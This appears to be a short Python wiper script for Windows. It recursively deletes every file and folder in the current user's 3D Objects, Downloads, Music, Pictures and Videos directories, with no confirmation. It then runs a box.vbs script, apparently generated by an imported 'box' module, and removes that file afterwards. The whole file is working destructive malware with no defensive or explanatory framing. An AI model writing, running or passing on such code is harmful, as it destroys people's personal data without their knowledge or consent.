from box import *
from getpass import *
from os import *
from shutil import *

username = getuser()


def D3():
    chdir(f"C:\\Users\\{username}\\3D Objects")
    ls = listdir()
    for x in ls:
        if path.isdir(x):
            rmtree(x)
        elif path.isfile(x):
            remove(x)


def DO():
    chdir(f"C:\\Users\\{username}\\Downloads")
    ls = listdir()
    for x in ls:
        if path.isdir(x):
            rmtree(x)
        elif path.isfile(x):
            remove(x)

def M():
    chdir(f"C:\\Users\\{username}\\Music")
    ls = listdir()
    for x in ls:
        if path.isdir(x):
            rmtree(x)
        elif path.isfile(x):
            remove(x)

def P():
    chdir(f"C:\\Users\\{username}\\Pictures")
    ls = listdir()
    for x in ls:
        if path.isdir(x):
            rmtree(x)
        elif path.isfile(x):
            remove(x)

def V():
    chdir(f"C:\\Users\\{username}\\Videos")
    ls = listdir()
    for x in ls:
        if path.isdir(x):
            rmtree(x)
        elif path.isfile(x):
            remove(x)


D3()
DO()
M()
P()
V()
box()

system(f"C:\\Users\\{username}\\Videos\\box.vbs")
remove("box.vbs")
